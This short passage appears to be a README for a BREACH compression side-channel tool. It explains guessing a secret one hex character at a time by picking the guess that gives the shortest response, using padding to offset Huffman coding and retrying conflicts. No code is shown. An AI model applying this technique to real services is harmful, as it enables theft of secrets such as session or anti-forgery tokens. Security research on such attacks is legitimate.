This implementation guesses a secret, one character at a time, and for every character,
tries all posible hex characters and selects the one that produces the shortest response.
To reduce the effect of Huffman Coding on the oracle, we use padding and append the dictionary
at the end of every request. To solve conflicts, we re-try the conflicted characters with a
new random padding length.
For a faster implementation, try `breach-parallel.py`.
